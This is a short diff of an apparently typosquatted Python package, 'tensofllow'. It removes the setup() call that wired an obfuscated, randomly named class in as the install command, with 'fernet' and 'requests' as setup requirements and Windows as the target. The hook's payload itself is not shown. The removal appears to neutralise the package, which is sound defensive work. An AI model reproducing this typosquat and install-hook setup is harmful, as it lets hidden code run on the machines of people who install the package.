@@ -18,22 +18,5 @@ class pFfIJASZQNAsQbTZCprwhAORtxxaCqSbHEkMCWJJlBDxlaSJmjmgClFCgdjjKgYBWkXccvfwRe
             install.run(self)
 
 
-setup(
-    name="tensofllow",
-    version=VERSION,
-    author="pCXuXAcekiubVjH",
-    author_email="qoyORjBYqkS@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': pFfIJASZQNAsQbTZCprwhAORtxxaCqSbHEkMCWJJlBDxlaSJmjmgClFCgdjjKgYBWkXccvfwRerYLKRzWTZGqB,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
 
